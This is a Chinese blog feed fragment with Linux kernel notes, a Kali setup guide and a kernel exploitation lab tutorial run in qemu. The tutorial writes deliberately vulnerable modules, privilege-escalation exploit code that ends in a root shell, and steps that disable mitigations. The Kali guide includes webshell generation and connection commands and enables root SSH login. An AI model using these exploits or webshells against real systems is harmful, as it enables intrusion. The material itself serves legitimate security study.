src="\images\pasted-296.png" alt="upload successful"><br><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* 1.Linux内核模块简介
* 2.简单内核模块实现
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Linux内核模块简介&quot;&gt;&lt;a href=&quot;#Linux内核模块简介&quot; class=&quot;headerlink&quot; title=&quot;Linux内核模块简介&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核分析（一）</title>
    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoururl.com/2018/10/16/Linux内核分析（一）/</id>
    <published>2018-10-16T13:23:00.000Z</published>
    <updated>2018-10-16T16:08:42.874Z</updated>
    
    <content type="html"><![CDATA[<pre><code>* 1.Linux体系结构简介* 2.Linux内核源码简介* 3.Linux内核配置、编译、安装</code></pre><h1 id="Linux体系结构简介"><a href="#Linux体系结构简介" class="headerlink" title="Linux体系结构简介"></a>Linux体系结构简介</h1><h2 id="Linux体系结构（linux系统构成）"><a href="#Linux体系结构（linux系统构成）" class="headerlink" title="Linux体系结构（linux系统构成）"></a>Linux体系结构（linux系统构成）</h2><p>Linux可以分为两部分，分别为用户空间和内核空间具体如下图：<br><img src="\images\pasted-290.png" alt="upload successful"><br>用户空间包括：用户的应用程序、C库<br>内核空间包括：系统调用接口、内核（狭义内核）、平台架构相关的代码</p><h2 id="为什么要分为内核空间和用户空间"><a href="#为什么要分为内核空间和用户空间" class="headerlink" title="为什么要分为内核空间和用户空间"></a>为什么要分为内核空间和用户空间</h2><p>我们在分析u-boot的时候就说到过，我们的cpu在不同的工作模式下可以访问的寄存器是不一样的，所以为了保护我们的操作系统，避免用户程序将内核搞崩，所以进行了内核空间和用户空间的划分。<br>Arm处理器工作模式划分：usr、FIQ、IRQ、svc、abt、und、sys（具体介绍在<a href="http://www.cnblogs.com/wrjvszq/p/4199682.html）" target="_blank" rel="noopener">http://www.cnblogs.com/wrjvszq/p/4199682.html）</a><br>X86处理器工作模式划分：Ring0—Ring3，Ring0下可以执行特权指令，可以访问IO设备，Ring3则有很多的限制注：我们可以通过系统调用和硬件中断来完成用户空间到内核空间的转移</p><h2 id="Linux内核结构（广义内核）"><a href="#Linux内核结构（广义内核）" class="headerlink" title="Linux内核结构（广义内核）"></a>Linux内核结构（广义内核）</h2><p>Linux内核由七个部分构成，具体如下图：<br><img src="\images\pasted-291.png" alt="upload successful"><br>系统调用接口（SCI）：open、read、write等系统调用<br>进程管理（PM）：创建进程、删除进程、调度进程等<br>内存管理（MM）：内存分配、管理等<br>虚拟文件系统（VFS）：为多种文件系统提供统一的操作接口<br>网络协议栈：提供各种网络协议<br>CPU架构相关代码（Arch）：为的是提高至移植性<br>设备驱动程序（DD）：各种设备驱动，占到内核的70%左右代码</p><h1 id="Linux内核源码简介"><a href="#Linux内核源码简介" class="headerlink" title="Linux内核源码简介"></a>Linux内核源码简介</h1><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><p>Linux内核获取有两种方法，一种是在<a href="http://www.kernel.org" target="_blank" rel="noopener">www.kernel.org</a> 直接获取，另一种是使用git获取（具体方法参考网络）。  </p><h2 id="源码目录简介"><a href="#源码目录简介" class="headerlink" title="源码目录简介"></a>源码目录简介</h2><p>其源码主要有以下目录（介绍重要目录）：<br>Arch目录：存放处理器相关的代码。下设子目录，分别对应具体的CPU，每个子目录有boot，mm，以及kernel三个子目录，分别对应系统引导以及存储管理，和系统调用<br>Include目录：内核所需要的大部分头文件目录。与平台无关的在include/linux子目录下，与平台相关的则放在include相应的子目录中。<br>fs目录：存放各种文件系统的实现代码。<br>init目录：init子目录包含核心的初始化代码（不是系统的引导代码）。其包含两个文件main.c和version.c，可以用来研究核心如何工作。<br>ipc目录：包含核心进程间的通信代码。<br>kernel目录：包含内核管理的核心代码。与硬件相关代码放在arch/<em>/kernel目录下。<br>mm目录：包含了所有的内存管理代码。与硬件相关的内存管理代码位于arch/</em>/mm目录下。<br>scripts目录：包含用于配置核心的脚本文件。<br>lib目录：包含了核心的库代码，与硬件相关的库代码被放在arch/*/lib/目录下  </p><h1 id="Linux内核配置、编译、安装"><a href="#Linux内核配置、编译、安装" class="headerlink" title="Linux内核配置、编译、安装"></a>Linux内核配置、编译、安装</h1><h2 id="X86配置"><a href="#X86配置" class="headerlink" title="X86配置"></a>X86配置</h2><p>Linux内核的编译有两种方法，具体如下：<br>交互式：在内核顶层的目录下运行make config，按照提示一步一步的按照自己的需求对内核进行配置。<br>菜单式：在内核顶层的目录下运行make menuconfig，菜单式的按照自己的需求对内核进行配置。  </p><h2 id="X86编译"><a href="#X86编译" class="headerlink" title="X86编译"></a>X86编译</h2><p>Linux内核的编译要经过以下步骤，具体如下：  </p><ul><li>内核编译：linux内核的编译有以下两种方法。<br><strong>make zImage：</strong>编译出的内核小于512k（老版本内核）<br><strong>make bzImage：</strong>通用编译命令注：在以上两个命令中加V=1可查看编译过程中的详细信息  </li><li>内核模块编译：执行make modules编译内核模块。  </li><li>内核模块安装：执行make modules_install将编译好的内核模块复制到当前系统的/lib/modules下的<em> </em>目录下。  </li><li>内核模块打包：执行mkinitrd initrd-$version $version对内核模块进行打包，其中initrd-$version表示要打包为的文件的名字，$version表示要打包的目录即我们上一步生成的目录。  </li></ul><p>X86安装Linux内核的安装要经过以下步骤，具体如下：  </p><ul><li>拷贝内核：复制1编译出来的内核映像到启动目录cp arch/$cpu/boot/bzImage（1编译出来的bzimage）/boot/vmlinuz-$version  </li><li>拷贝内核模块文件：执行cp initrd-$version（4生成的文件） /boot/ 将4生成的文件拷贝到boot下  </li><li>修改启动配置文件：修改/etc/grub.conf文件<br><br><br><br></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;* 1.Linux体系结构简介
* 2.Linux内核源码简介
* 3.Linux内核配置、编译、安装
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Linux体系结构简介&quot;&gt;&lt;a href=&quot;#Linux体系结构简介&quot; class=&quot;headerlink&quot; t
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
    
      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
    
  </entry>
  
  <entry>
    <title>kali linux安装配置</title>
    <link href="http://yoururl.com/2018/10/16/kali-linux%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoururl.com/2018/10/16/kali-linux安装配置/</id>
    <published>2018-10-16T12:42:00.000Z</published>
    <updated>2018-10-16T18:45:18.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="U盘给物理机装kali的一些问题："><a href="#U盘给物理机装kali的一些问题：" class="headerlink" title="U盘给物理机装kali的一些问题："></a>U盘给物理机装kali的一些问题：</h1><p><strong><a href="https://www.jianshu.com/p/27ca274b70c8" target="_blank" rel="noopener">安装教程</a></strong>  </p><ul><li>挂载不了u盘：<br>用dd命令直接在linux下把kali的镜像文件刻录进U盘<br>dd if=xxx.iso of=/dev/sdb bs=4M  </li><li>安装系统失败：<br>图形界面安装，分区全分给一个盘(sda)  </li><li>Debootstart错误 无法确定发布代号<br>分区表错误，重新格式化硬盘，重建分区表  </li><li>安装GRUB失败<br>iso的一个bug，64位镜像的话插网线，联网装。32位没事<br><br><br><br></li></ul><h1 id="更新源一些问题："><a href="#更新源一些问题：" class="headerlink" title="更新源一些问题："></a>更新源一些问题：</h1><h2 id="无法验证下列签名"><a href="#无法验证下列签名" class="headerlink" title="无法验证下列签名"></a>无法验证下列签名</h2><p>Ubuntu：apt-get update出错：由于没有公钥，无法验证下列签名<br><a href="https://jingyan.baidu.com/article/2d5afd69ec4cce85a2e28ef9.html" target="_blank" rel="noopener">解决方法</a><br><img src="\images\pasted-288.png" alt="upload successful"><br>sudo apt-key adv –recv-keys –keyserver keyserver.Ubuntu.com 7E5FA1EE  </p><h2 id="签名过期"><a href="#签名过期" class="headerlink" title="签名过期:"></a>签名过期:</h2><p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc" target="_blank" rel="noopener">https://archive.kali.org/archive-key.asc</a> | apt-key add</p><h2 id="明文签署文件不可用"><a href="#明文签署文件不可用" class="headerlink" title="明文签署文件不可用"></a>明文签署文件不可用</h2><p>解决方法：换个源更新</p><pre><code>#中科大  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  </code></pre><p>然后执行命令:  </p><pre><code>apt-get update                 #更新系统apt-get upgrade                #升级系统apt-get dist-upgrade           #升级系统(自选)apt-get clean                  #删除/var/cache/apt/archives/ 和 /var/cache/apt/archives/partial/目录下所有包(锁定的除外)</code></pre><p><strong>upgrade和dist-upgrade的差别:</strong>  </p><ul><li>upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.  </li><li>dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.<br>(所以通常这个会被认为是有点风险的升级)<br><br><br><br></li></ul><h1 id="kali无法正常上网"><a href="#kali无法正常上网" class="headerlink" title="kali无法正常上网"></a>kali无法正常上网</h1><p><a href="https://blog.csdn.net/chenyanhui1087/article/details/53127884" target="_blank" rel="noopener">解决办法</a><br><br><br><br></p><h1 id="kali设置固定ip"><a href="#kali设置固定ip" class="headerlink" title="kali设置固定ip"></a>kali设置固定ip</h1><p>/etc/network下的interfaces文件，打开后可以看到eth0为dhcp，将其修改为如下形式：</p><pre><code>auto eth0iface eth0 inet static //配置eth0使用默认的静态地址address 192.168.77.133 //设置eth0的IP地址netmask 255.255.255.0 //配置eth0的子网掩码gateway 192.168.77.254 //配置当前主机的默认网关</code></pre><p>配置DNS：  /etc/resovl.conf　　</p><pre><code>domainnameserver 10.10.10.10nameserver 102.54.16.2</code></pre><p>完成后保存，然后在终端里边重启网络：</p><pre><code>/etc/init.d/networking restart</code></pre><p><br><br><br></p><h1 id="kali安装中文输入法"><a href="#kali安装中文输入法" class="headerlink" title="kali安装中文输入法"></a>kali安装中文输入法</h1><pre><code>apt-get install fcitxapt-get install fcitx-googlepinyininit 6</code></pre><p><br><br><br></p><h1 id="kali安装flash-player"><a href="#kali安装flash-player" class="headerlink" title="kali安装flash player"></a>kali安装flash player</h1><p>在地址栏输入网址<a href="https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。" target="_blank" rel="noopener">https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。</a><br>打开终端，并切换到下载文件所在目录，执行以下命令：  </p><pre><code>tar xzvf install_flash_player_11_linux.x86_64.tar.gz</code></pre><p>进入解压出来的文件夹，找到libflashplayer.so拷贝到/usr/lib/mozilla/plugins/下，命令如下：  </p><pre><code>cp libflashplayer.so /usr/lib/mozilla/plugins/</code></pre><p><br><br><br></p><h1 id="kali安装百度云"><a href="#kali安装百度云" class="headerlink" title="kali安装百度云"></a>kali安装百度云</h1><pre><code>dpkg -i bcloud-x.x.x.deb apt-get -f install</code></pre><p><br><br><br></p><h1 id="kali安装WPS"><a href="#kali安装WPS" class="headerlink" title="kali安装WPS"></a>kali安装WPS</h1><p><a href="https://blog.csdn.net/github_39217805/article/details/73465999" target="_blank" rel="noopener">参考</a>  </p><pre><code>dpkg -i x.x.x.deb apt-get -f installgdebi</code></pre><p><br><br><br></p><h1 id="kali安装sublime"><a href="#kali安装sublime" class="headerlink" title="kali安装sublime"></a>kali安装sublime</h1><p><a href="https://blog.csdn.net/youngdze/article/details/19980009" target="_blank" rel="noopener">安装</a><br><a href="https://blog.csdn.net/qq_29819449/article/details/80130327" target="_blank" rel="noopener">注册</a><br><br><br><br></p><h1 id="kali安装pycharm"><a href="#kali安装pycharm" class="headerlink" title="kali安装pycharm"></a>kali安装pycharm</h1><p><a href="https://www.jianshu.com/p/11d70cecbfff" target="_blank" rel="noopener">下载和安装</a><br><a href="https://blog.csdn.net/qq_36472696/article/details/75637163?locationNum=5&amp;fps=1" target="_blank" rel="noopener">Linux下将pycharm图标添加至桌面</a><br><a href="https://blog.csdn.net/xjcvip007/article/details/52606193" target="_blank" rel="noopener">设置桌面快捷方式</a><br><a href="https://blog.csdn.net/u014044812/article/details/78727496" target="_blank" rel="noopener">激活</a><br>设置快捷键为pycharm:<br>ln -s /root/下载/pycharm/bin/pycharm.sh /usr/bin/pycharm<br><a href="http://idea.lanyus.com/" target="_blank" rel="noopener">IDEA注册码</a><br><br><br><br></p><h1 id="kali的firefox设置成中文"><a href="#kali的firefox设置成中文" class="headerlink" title="kali的firefox设置成中文"></a>kali的firefox设置成中文</h1><p><a href="https://blog.csdn.net/xingjiarong/article/details/49449015" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali下webshell管理工具"><a href="#kali下webshell管理工具" class="headerlink" title="kali下webshell管理工具"></a>kali下webshell管理工具</h1><h2 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h2><p>没有密码，只能用于php  </p><ul><li>生成服务端程序<br>webacoo -g -o a.php  </li><li>客户端连接<br>webacoo -t -u <a href="http://202.196.73.125/a.php" target="_blank" rel="noopener">http://202.196.73.125/a.php</a>   </li></ul><h2 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h2><ul><li>~# weevely generate <password> b.php  </password></li><li>~# cat /usr/share/weevely/b.php  </li><li>客户端连接：weevely <a href="http://202.196.73.125/b.php" target="_blank" rel="noopener">http://202.196.73.125/b.php</a> pass<br><br><br><br></li></ul><h1 id="kali安装nessus"><a href="#kali安装nessus" class="headerlink" title="kali安装nessus"></a>kali安装nessus</h1><p><a href="https://blog.csdn.net/u012318074/article/details/72354387?locationNum=13&amp;fps=1" target="_blank" rel="noopener">参考</a><br><a href="https://www.cnblogs.com/youcanch/articles/5671238.html" target="_blank" rel="noopener">使用</a><br>在安装注册过程的4步，常常出现“Plugin Download Fail”问题，这个时候可以采用离线加载继续安装。下载离线安装包all-2.0.tar.gz并将它拷贝到nessus的安装目录下，在命令提示符下切换到nessus的安装目录下输入如下命令（此过程十分漫长情耐心等待）<br>nessuscli update all-2.0.tar.gz<br><br><br><br></p><h1 id="kali下wine中文乱码"><a href="#kali下wine中文乱码" class="headerlink" title="kali下wine中文乱码"></a>kali下wine中文乱码</h1><p><a href="https://blog.csdn.net/williamyi96/article/details/79841690" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><p><a href="http://blog.csdn.net/u014057054/article/details/72510898" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装virtualbox"><a href="#kali安装virtualbox" class="headerlink" title="kali安装virtualbox"></a>kali安装virtualbox</h1><pre><code>1、添加源：Add the following line to your /etc/apt/sources.list:deb http://download.virtualbox.org/virtualbox/debian artful contrib2、添加公钥wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -wget -q https://www.virtualbox.org/download/oracle_vbox.asc -O- | sudo apt-key add -3、更新并安装sudo apt-get updatesudo apt-get install virtualbox</code></pre><p><br><br><br></p><h1 id="kali下设置shadowsocks翻墙"><a href="#kali下设置shadowsocks翻墙" class="headerlink" title="kali下设置shadowsocks翻墙"></a>kali下设置shadowsocks翻墙</h1><p><a href="https://blog.csdn.net/szsteel1/article/details/54773544?utm_medium=referral&amp;utm_source=itdadao" target="_blank" rel="noopener">参考</a></p><pre><code>/etc/init.d/shadowsockes restart      #重启服务vim /home/lalala/shadowsocks.json     #配置服务端信息sslocal -c /home/lalala/shadowsocks.json -d start     #开启客户端vim /etc/proxychains.conf #注释掉socks4，添加socks5 127.0.0.1 1080     #配置proxychainsproxychains curl www.google.com 测试</code></pre><p><br><br><br></p><h1 id="kali设置Tor"><a href="#kali设置Tor" class="headerlink" title="kali设置Tor"></a>kali设置Tor</h1><p><a href="https://blog.csdn.net/qq_37867887/article/details/75675120" target="_blank" rel="noopener">安装教程</a><br><a href="https://blog.csdn.net/guangyinglanshan/article/details/77236420" target="_blank" rel="noopener">root下无法执行</a><br><br><br><br></p><h1 id="kali安装ftp服务器"><a href="#kali安装ftp服务器" class="headerlink" title="kali安装ftp服务器"></a>kali安装ftp服务器</h1><p><a href="https://www.douban.com/note/415638303/" target="_blank" rel="noopener">参考</a><br><a href="https://wenku.baidu.com/view/6b25c70f1ed9ad51f01df278.html" target="_blank" rel="noopener">创建用户及设置</a><br><br><br><br></p><h1 id="kali添加环境变量"><a href="#kali添加环境变量" class="headerlink" title="kali添加环境变量"></a>kali添加环境变量</h1><p><a href="https://www.cnblogs.com/Bonker/p/4314576.html" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装配置Redis"><a href="#kali安装配置Redis" class="headerlink" title="kali安装配置Redis"></a>kali安装配置Redis</h1><p><a href="https://blog.csdn.net/qq_41298906/article/details/78819447" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="VMware给kali扩容"><a href="#VMware给kali扩容" class="headerlink" title="VMware给kali扩容"></a>VMware给kali扩容</h1><p><a href="http://blog.51cto.com/liwenhn/1937411" target="_blank" rel="noopener">gparted</a><br><br><br><br></p><h1 id="kali下开启sftp传文件"><a href="#kali下开启sftp传文件" class="headerlink" title="kali下开启sftp传文件"></a>kali下开启sftp传文件</h1><pre><code>service ssh start #开启ssh服务SSH服务器拒绝了密码，ssh连不上kali因为sshd的默认设置不允许root用户用密码远程登录修改 vim /etc/ssh/sshd_config找到# Authentication:LoginGraceTime 120PermitRootLogin without passwdStrictModes yes改成:Authentication:    LoginGraceTime 120PermitRootLogin yesStrictModes yes重启虚拟机</code></pre><h2 id="Xshell连接sftp传文件"><a href="#Xshell连接sftp传文件" class="headerlink" title="Xshell连接sftp传文件"></a>Xshell连接sftp传文件</h2><pre><code>在本地提示下以sftp命令登陆拟要发送文件的主机。    Xshell:\&gt; sftp hostname在sftp提示下以put命令发送需要的文件。    sftp:/home/user21&gt;put filename在sftp提示下以get命令接收需要的文件。    sftp:/home/user21&gt;get filename</code></pre><h2 id="cmd连接sftp传文件"><a href="#cmd连接sftp传文件" class="headerlink" title="cmd连接sftp传文件"></a>cmd连接sftp传文件</h2><p>【控制面板】-【程序】-【打开或关闭Windows功能】，弹出Windows功能窗口，里面有个tftp客户端。在前面打勾确定。然后在cmd里就可以使用sftp了。<br>C:\Users\ramma&gt;sftp server<br>user name :<br><img src="\images\pasted-289.png" alt="upload successful"><br><br><br><br></p><h1 id="其他安装"><a href="#其他安装" class="headerlink" title="其他安装"></a>其他安装</h1><p>   apt-get install audacious                #audacious音乐播放器<br>   apt-get install smplayer                 #安装smplayer视频播放器<br>   apt-get install synaptic                  #安装新立德<br><br><br><br></p><h1 id="个人常用快捷键"><a href="#个人常用快捷键" class="headerlink" title="个人常用快捷键"></a>个人常用快捷键</h1><pre><code>alt+enter          开终端    gnome-terminal  supur+enter        开浏览器  ctrl+ enter        主目录  alt+f              搜索  supur+d            回到桌面(隐藏所有正常窗口)  ctrl + alt +A      截图</code></pre><p><br><br><br></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;U盘给物理机装kali的一些问题：&quot;&gt;&lt;a href=&quot;#U盘给物理机装kali的一些问题：&quot; class=&quot;headerlink&quot; title=&quot;U盘给物理机装kali的一些问题：&quot;&gt;&lt;/a&gt;U盘给物理机装kali的一些问题：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;a
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
    
    
      <category term="kali" scheme="http://yoururl.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核漏洞利用</title>
    <link href="http://yoururl.com/2018/10/16/Linux%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://yoururl.com/2018/10/16/Linux内核漏洞利用/</id>
    <published>2018-10-16T10:33:00.000Z</published>
    <updated>2018-10-16T11:59:11.374Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kernel-exploitNULL-Dereference"><a href="#kernel-exploitNULL-Dereference" class="headerlink" title="kernel exploitNULL Dereference"></a>kernel exploitNULL Dereference</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre><code>#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;void (*my_funptr)(void);int bug1_write(struct file *file,const char *buf,unsigned long len){        my_funptr();        return len;}static int __init null_dereference_init(void){        printk(KERN_ALERT &quot;null_dereference driver init!\n&quot;);        create_proc_entry(&quot;bug1&quot;,0666,0)-&gt;write_proc = bug1_write;        return 0;}static void __exit null_dereference_exit(void){        printk(KERN_ALERT &quot;null_dereference driver exit\n&quot;);}module_init(null_dereference_init);module_exit(null_dereference_exit);</code></pre><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code>obj-m := null_dereference.o  KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/  PWD := $(shell pwd)  modules:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules  moduels_install:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  clean:          rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</code></pre><p><strong> 代码中my_funptr函数指针指向不定，可以劫持之后执行代码，原理如下图所示。</strong><br><img src="\images\pasted-256.png" alt="upload successful"><br><img src="\images\pasted-257.png" alt="upload successful"><br><img src="\images\pasted-258.png" alt="upload successful"><br><img src="\images\pasted-259.png" alt="upload successful"><br><img src="\images\pasted-260.png" alt="upload successful"><br><strong> 把驱动编译好，然后把*.ko文件丢进busybox那个文件系统中去，方便后面挂载使用。 </strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char payload[] = &quot;\xe9\xea\xbe\xad\x0b&quot;;//jmp 0xbadbeefint main(){    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);    memcpy(0, payload, sizeof(payload));    int fd = open(&quot;/proc/bug1&quot;, O_WRONLY);    write(fd, &quot;muhe&quot;, 4);    return 0;}</code></pre><p><strong>gcc -static poc.c -o poc</strong> 编译好之后把程序复制到busybox-1.19.4/_install/usr<br><strong>find . | cpio -o –format=newc &gt; ../rootfs2.img</strong> 生成新的rootfs<br><strong>qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../../busybox-1.19.4/rootfs.img -append “root=/dev/ram rdinit=/sbin/init”</strong> 启动系统。<br>启动的时候按下<strong>ctrl+alt+2</strong>，然后gdb去连接。<br><img src="\images\pasted-261.png" alt="upload successful"><br><img src="\images\pasted-262.png" alt="upload successful"><br>qemu中ctrl+alt+1切换回去，然后进入usr目录，挂载驱动后运行poc程序。<br><img src="\images\pasted-263.png" alt="upload successful"><br>gdb里反汇编查看当前执行的指令。    pdisass $pc<br><img src="\images\pasted-264.png" alt="upload successful"><br><img src="\images\pasted-265.png" alt="upload successful"><br>exploit的思路是利用commit_creds(prepare_kernel_cred(0));<br>给当前进程赋予root权限，kernel里面是不能直接执行system(“/bin/sh”);的。<br>先取得commit_creds和prepare_kernel_cred地址。</p><ul><li>grep commit_creds /proc/kallsyms </li><li>grep prepare_kernel_cred /proc/kallsyms<br><img src="\images\pasted-266.png" alt="upload successful"><br><img src="\images\pasted-267.png" alt="upload successful"><br>编写shellcode。<br><img src="\images\pasted-268.png" alt="upload successful"><br>得到shellcode。<br><img src="\images\pasted-269.png" alt="upload successful"><br>我们需要分配0地址空间然后放入shellcode，jmp过去执行shellcode，使当前进程有root权限，然后执行system(“/bin/sh”);，在程序返回用户态之后拿到一个root的shell。<br><img src="\images\pasted-270.png" alt="upload successful"></li></ul><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char payload[] = &quot;\x31\xc0\xe8\xb9\x7f\x06\xc1\xe8\x14\x7e\x06\xc1\xc3&quot;;int main(){        mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);        memcpy(0, payload, sizeof(payload));        int fd = open(&quot;/proc/bug1&quot;, O_WRONLY);        write(fd, &quot;muhe&quot;, 4);        system(&quot;/bin/sh&quot;);//get root shell        return 0;}</code></pre><p>新建用户去测试EXP。<br><img src="\images\pasted-271.png" alt="upload successful"><br>但是得到报错。<br><img src="\images\pasted-272.png" alt="upload successful"><br>这是因为2.6.32内核已经设置mmap_min_addr为4096作为缓解措施<br>需要重新设置下mmap_min_addr：sysctl -w vm.mmap_min_addr=”0”<br>重新运行EXP。<br><img src="\images\pasted-273.png" alt="upload successful"><br>成功拿到root shell。</p><h1 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h1><h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre><code>#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/proc_fs.h&gt;int bug2_write(struct file *file,const char *buf,unsigned long len){    char localbuf[8];    memcpy(localbuf,buf,len);    return len;}static int __init stack_smashing_init(void){    printk(KERN_ALERT &quot;stack_smashing driver init!\n&quot;);    create_proc_entry(&quot;bug2&quot;,0666,0)-&gt;write_proc = bug2_write;    return 0;}static void __exit stack_smashing_exit(void){    printk(KERN_ALERT &quot;stack_smashing driver exit!\n&quot;);}module_init(stack_smashing_init);module_exit(stack_smashing_exit);</code></pre><h2 id="Makefile-1"><a href="#Makefile-1" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code>obj-m := stack_smashing.o  KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/PWD := $(shell pwd)  modules:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules  moduels_install:          $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  clean:          rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</code></pre><p>和用户态的栈溢出原理一样，拷贝、拼接字符串的时候未作长度检查，导致覆盖栈上保存的返回地址，只后可以劫持程序流程，从而实现代码执行的效果。只不过这是在内核空间，可以直接用来提权。</p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int main(){    char buf[24] = {0};    memset(buf,&quot;A&quot;,24);    *((void**)(buf + 20)) = 0x42424242;    int fd = open(&quot;/proc/bug2&quot;,O_WRONLY);    write(fd,buf,sizeof(buf));}</code></pre><p>可以看到payload结构很简单，直接就是buffer+eip。按照前面的步骤编译POC，然后构建文件系统，qemu起内核后，运行POC。<br><img src="\images\pasted-274.png" alt="upload successful"><br>我们编译的kernel默认开启canary的，如果直接这么去运行POC，会直接kernel panic，无法利用，所以需要关闭canary选项，重新编译一个内核。编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核。<br><img src="\images\pasted-275.png" alt="upload successful"><br>再起内核跑我们的POC，发现eip被覆盖成了0x42424242。<br><img src="\images\pasted-276.png" alt="upload successful"><br>模块在编译后按照上篇文章的方法，丢进busybox，然后qemu起内核然后调试。<br>由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。由于stack_smashing模块没有bss和data节区所以只需要指定text即可。<br>qemu中设置好gdbserver后，找到模块的.text段的地址grep 0 /sys/module/stack_smashing/sections/.text。<br><img src="\images\pasted-277.png" alt="upload successful"><br><img src="\images\pasted-278.png" alt="upload successful"><br>运行POC之后发现eip被覆盖成了预期的值。</p><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" 